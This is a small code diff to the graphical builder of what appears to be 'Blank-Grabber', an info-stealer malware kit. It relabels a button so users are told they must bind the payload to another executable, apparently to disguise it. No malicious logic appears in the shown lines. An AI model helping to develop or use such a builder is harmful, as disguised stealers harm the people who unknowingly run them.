@@ -67,7 +67,7 @@ class Builder:
 		BoundFileNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
 		BoundFileNameLabel.place(x= 560, y= 200, anchor= "e")
 		BoundFileNameLabel.bind("<ButtonRelease-1>", lambda event: self.unBind(event))
-		BindButton = tk.Button(text= "Bind Executable", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.BindFileSelect(BoundFileNameLabel))
+		BindButton = tk.Button(text= "Bind Executable (YOU MUST BIND)", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "30", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.BindFileSelect(BoundFileNameLabel))
 		BindButton.place(x= 560, y= 180, anchor= "e")
 
 		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/Blank-c/Blank-Grabber", new= 2))
